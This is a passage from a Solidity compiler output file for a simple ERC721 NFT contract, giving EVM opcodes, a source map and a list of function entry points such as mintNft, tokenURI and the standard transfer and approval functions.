0x0 DUP4 ADD DUP5 PUSH2 0x1A15 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x1C88 PUSH1 0x0 DUP4 ADD DUP8 PUSH2 0x1A15 JUMP JUMPDEST PUSH2 0x1C95 PUSH1 0x20 DUP4 ADD DUP7 PUSH2 0x1A15 JUMP JUMPDEST PUSH2 0x1CA2 PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x1C49 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x60 DUP4 ADD MSTORE PUSH2 0x1CB4 DUP2 DUP5 PUSH2 0x1A33 JUMP JUMPDEST SWAP1 POP SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CD4 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1A24 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1CF4 DUP2 DUP5 PUSH2 0x1A6C JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D15 DUP2 PUSH2 0x1AA5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D35 DUP2 PUSH2 0x1AC8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D55 DUP2 PUSH2 0x1AEB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D75 DUP2 PUSH2 0x1B0E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D95 DUP2 PUSH2 0x1B31 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DB5 DUP2 PUSH2 0x1B54 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DD5 DUP2 PUSH2 0x1B77 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1DF5 DUP2 PUSH2 0x1B9A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E15 DUP2 PUSH2 0x1BBD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E35 DUP2 PUSH2 0x1BE0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E55 DUP2 PUSH2 0x1C03 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E75 DUP2 PUSH2 0x1C26 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E91 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C49 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EA1 PUSH2 0x1EB2 JUMP JUMPDEST SWAP1 POP PUSH2 0x1EAD DUP3 DUP3 PUSH2 0x2097 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x1ED7 JUMPI PUSH2 0x1ED6 PUSH2 0x2126 JUMP JUMPDEST JUMPDEST PUSH2 0x1EE0 DUP3 PUSH2 0x2169 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F30 DUP3 PUSH2 0x2019 JUMP JUMPDEST SWAP2 POP PUSH2 0x1F3B DUP4 PUSH2 0x2019 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x1F70 JUMPI PUSH2 0x1F6F PUSH2 0x20C8 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F86 DUP3 PUSH2 0x2019 JUMP JUMPDEST SWAP2 POP PUSH2 0x1F91 DUP4 PUSH2 0x2019 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x1FA4 JUMPI PUSH2 0x1FA3 PUSH2 0x20C8 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1FBA DUP3 PUSH2 0x1FF9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2050 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2035 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x205F JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x207D JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH2 0x2091 JUMPI PUSH2 0x2090 PUSH2 0x20F7 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x20A0 DUP3 PUSH2 0x2169 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x20BF JUMPI PUSH2 0x20BE PUSH2 0x2126 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4552433732313A2063616C6C6572206973206E6F7420746F6B656E206F776E65 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x72206F7220617070726F76656400000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E7366657220746F206E6F6E204552433732315265 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x63656976657220696D706C656D656E7465720000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E736665722066726F6D20696E636F727265637420 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6F776E6572000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20746F6B656E20616C7265616479206D696E74656400000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A207472616E7366657220746F20746865207A65726F20616464 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7265737300000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F766520746F2063616C6C657200000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A2061646472657373207A65726F206973206E6F742061207661 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6C6964206F776E65720000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A206D696E7420746F20746865207A65726F2061646472657373 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20696E76616C696420746F6B656E2049440000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732314D65746164617461203A2055524920717565727920666F72206E PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6F6E6578697374656E7420746F6B656E00000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F76616C20746F2063757272656E74206F776E65 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7200000000000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x4552433732313A20617070726F76652063616C6C6572206973206E6F7420746F PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6B656E206F776E6572206F7220617070726F76656420666F7220616C6C000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x249F DUP2 PUSH2 0x1FAF JUMP JUMPDEST DUP2 EQ PUSH2 0x24AA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x24B6 DUP2 PUSH2 0x1FC1 JUMP JUMPDEST DUP2 EQ PUSH2 0x24C1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x24CD DUP2 PUSH2 0x1FCD JUMP JUMPDEST DUP2 EQ PUSH2 0x24D8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x24E4 DUP2 PUSH2 0x2019 JUMP JUMPDEST DUP2 EQ PUSH2 0x24EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID PUSH10 0x7066733A2F2F516D6472 PUSH26 0x6F4578706745515151674A506F727577474A795A6D7A36537156 CALLVALUE CHAINID MSTORE SLOAD PC BALANCE PUSH10 0x373343543369586EA264 PUSH10 0x706673582212209AA804 0xF7 0xE2 ORIGIN PUSH1 0xD3 SWAP1 0xEC PUSH29 0xE540589DB091D18016E1F41B07A8E632FF977524F764736F6C63430008 SMOD STOP CALLER ","sourceMap":"115:798:14:-:0;;;339:72;;;;;;;;;;1390:113:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1464:5;1456;:13;;;;;;;;;;;;:::i;:::-;;1489:7;1479;:17;;;;;;;;;;;;:::i;:::-;;1390:113;;403:1:14::1;386:14;:18;;;;115:798:::0;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;:::o;7:320:15:-;51:6;88:1;82:4;78:12;68:22;;135:1;129:4;125:12;156:18;146:81;;212:4;204:6;200:17;190:27;;146:81;274:2;266:6;263:14;243:18;240:38;237:84;;;293:18;;:::i;:::-;237:84;58:269;7:320;;;:::o;333:180::-;381:77;378:1;371:88;478:4;475:1;468:15;502:4;499:1;492:15;115:798:14;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@TOKEN_URI_3276":{"entryPoint":1998,"id":3276,"parameterSlots":0,"returnSlots":0},"@_afterTokenTransfer_997":{"entryPoint":4793,"id":997,"parameterSlots":4,"returnSlots":0},"@_approve_830":{"entryPoint":2790,"id":830,"parameterSlots":2,"returnSlots":0},"@_beforeTokenTransfer_984":{"entryPoint":4499,"id":984,"parameterSlots":4,"returnSlots":0},"@_checkOnERC721Received_938":{"entryPoint":4799,"id":938,"parameterSlots":4,"returnSlots":1},"@_exists_499":{"entryPoint":4434,"id":499,"parameterSlots":1,"returnSlots":1},"@_isApprovedOrOwner_533":{"entryPoint":2975,"id":533,"parameterSlots":2,"returnSlots":1},"@_mint_654":{"entryPoint":5332,"id":654,"parameterSlots":2,"returnSlots":0},"@_msgSender_1501":{"entryPoint":2782,"id":1501,"parameterSlots":0,"returnSlots":1},"@_ownerOf_481":{"entryPoint":3886,"id":481,"parameterSlots":1,"returnSlots":1},"@_requireMinted_876":{"entryPoint":2707,"id":876,"parameterSlots":1,"returnSlots":0},"@_safeMint_548":{"entryPoint":4404,"id":548,"parameterSlots":2,"returnSlots":0},"@_safeMint_577":{"entryPoint":5206,"id":577,"parameterSlots":3,"returnSlots":0},"@_safeTransfer_468":{"entryPoint":4312,"id":468,"parameterSlots":4,"returnSlots":0},"@_setApprovalForAll_862":{"entryPoint":3947,"id":862,"parameterSlots":3,"returnSlots":0},"@_transfer_806":{"entryPoint":3124,"id":806,"parameterSlots":3,"returnSlots":0},"@approve_310":{"entryPoint":1261,"id":310,"parameterSlots":2,"returnSlots":0},"@balanceOf_171":{"entryPoint":1814,"id":171,"parameterSlots":1,"returnSlots":1},"@getApproved_328":{"entryPoint":1191,"id":328,"parameterSlots":1,"returnSlots":1},"@getTokenCounter_3338":{"entryPoint":1804,"id":3338,"parameterSlots":0,"returnSlots":1},"@isApprovedForAll_363":{"entryPoint":2453,"id":363,"parameterSlots":2,"returnSlots":1},"@isContract_1177":{"entryPoint":5297,"id":1177,"parameterSlots":1,"returnSlots":1},"@mintNft_3314":{"entryPoint":2292,"id":3314,"parameterSlots":0,"returnSlots":0},"@name_209":{"entryPoint":1045,"id":209,"parameterSlots":0,"returnSlots":1},"@ownerOf_199":{"entryPoint":1669,"id":199,"parameterSlots":1,"returnSlots":1},"@safeTransferFrom_409":{"entryPoint":1637,"id":409,"parameterSlots":3,"returnSlots":0},"@safeTransferFrom_439":{"entryPoint":2194,"id":439,"parameterSlots":4,"returnSlots":0},"@setApprovalForAll_345":{"entryPoint":2172,"id":345,"parameterSlots":2,"returnSlots":0},"@supportsInterface_147":{"entryPoint":819,"id":147,"parameterSlots":1,"returnSlots":1},"@supportsInterface_1709":{"entryPoint":2601,"id":1709,"parameterSlots":1,"returnSlots":1},"@symbol_219":{"entryPoint":2026,"id":219,"parameterSlots":0,"returnSlots":1},"@tokenURI_3330":{"entryPoint":2374,"id":3330,"parameterSlots":1,"returnSlots":1},"@transferFrom_390":{"entryPoint":1541,"id":390,"parameterSlots":3,"returnSlots":0},"abi_decode_available_length_t_bytes_memory_ptr":{"entryPoint":5874,"id":null,"parameterSlots":3,"returnSlots":1},"abi_decode_t_address":{"entryPoint":5940,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bool":{"entryPoint":5961,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes4":{"entryPoint":5982,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes4_fromMemory":{"entryPoint":6003,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_bytes_memory_ptr":{"entryPoint":6024,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_uint256":{"entryPoint":6070,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address":{"entryPoint":6091,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_addresst_address":{"entryPoint":6136,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_addresst_addresst_uint256":{"entryPoint":6200,"id":null,"parameterSlots":2,"returnSlots":3},"abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr":{"entryPoint":6283,"id":null,"parameterSlots":2,"returnSlots":4},"abi_decode_tuple_t_addresst_bool":{"entryPoint":6414,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_addresst_uint256":{"entryPoint":6478,"id":null,"parameterSlots":2,"returnSlots":2},"abi_decode_tuple_t_bytes4":{"entryPoint":6542,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_bytes4_fromMemory":{"entryPoint":6587,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256":{"entryPoint":6632,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":6677,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bool_to_t_bool_fromStack":{"entryPoint":6692,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack":{"entryPoint":6707,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack":{"entryPoint":6764,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack":{"entryPoint":6821,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack":{"entryPoint":6856,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack":{"entryPoint":6891,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack":{"entryPoint":6926,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack":{"entryPoint":6961,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack":{"entryPoint":6996,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack":{"entryPoint":7031,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack":{"entryPoint":7066,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack":{"entryPoint":7101,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b_to_t_string_memory_ptr_fromStack":{"entryPoint":7136,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack":{"entryPoint":7171,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack":{"entryPoint":7206,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":7241,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":7256,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed":{"entryPoint":7283,"id":null,"parameterSlots":5,"returnSlots":1},"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed":{"entryPoint":7359,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7386,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7420,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7452,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7484,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7516,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7548,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7580,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7612,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7644,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7676,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7708,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7740,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":7772,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":7804,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_memory":{"entryPoint":7831,"id":null,"parameterSlots":1,"returnSlots":1},"allocate_unbounded":{"entryPoint":7858,"id":null,"parameterSlots":0,"returnSlots":1},"array_allocation_size_t_bytes_memory_ptr":{"entryPoint":7868,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_bytes_memory_ptr":{"entryPoint":7917,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_string_memory_ptr":{"entryPoint":7928,"id":null,"parameterSlots":1,"returnSlots":1},"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack":{"entryPoint":7939,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":7956,"id":null,"parameterSlots":2,"returnSlots":1},"checked_add_t_uint256":{"entryPoint":7973,"id":null,"parameterSlots":2,"returnSlots":1},"checked_sub_t_uint256":{"entryPoint":8059,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":8111,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bool":{"entryPoint":8129,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bytes4":{"entryPoint":8141,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":8185,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":8217,"id":null,"parameterSlots":1,"returnSlots":1},"copy_calldata_to_memory":{"entryPoint":8227,"id":null,"parameterSlots":3,"returnSlots":0},"copy_memory_to_memory":{"entryPoint":8242,"id":null,"parameterSlots":3,"returnSlots":0},"extract_byte_array_length":{"entryPoint":8293,"id":null,"parameterSlots":1,"returnSlots":1},"finalize_allocation":{"entryPoint":8343,"id":null,"parameterSlots":2,"returnSlots":0},"panic_error_0x11":{"entryPoint":8392,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x22":{"entryPoint":8439,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x41":{"entryPoint":8486,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d":{"entryPoint":8533,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae":{"entryPoint":8538,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":8543,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":8548,"id":null,"